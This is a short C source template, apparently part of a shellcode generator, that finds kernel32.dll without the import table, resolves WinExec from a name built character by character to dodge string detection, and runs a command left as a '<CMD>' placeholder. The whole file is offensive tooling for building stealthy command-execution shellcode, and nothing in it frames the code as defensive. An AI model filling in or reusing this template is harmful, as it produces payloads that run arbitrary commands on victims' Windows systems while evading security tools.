// template.c

#include "addresshunter.h"
#include <stdio.h>

typedef UINT(WINAPI* WINEXEC)(LPCSTR, UINT);

void exec() {
    UINT64 kernel32dll;
    UINT64 WinExecFunc;

    kernel32dll = GetKernel32();

    CHAR winexec_c[] = {'W','i','n','E','x','e','c', 0};
    WinExecFunc = GetSymbolAddress((HANDLE)kernel32dll, winexec_c);

    CHAR cmd_c[] = {'<CMD>', 0};
    ((WINEXEC)WinExecFunc)(cmd_c, <SHOWWINDOW>);
}
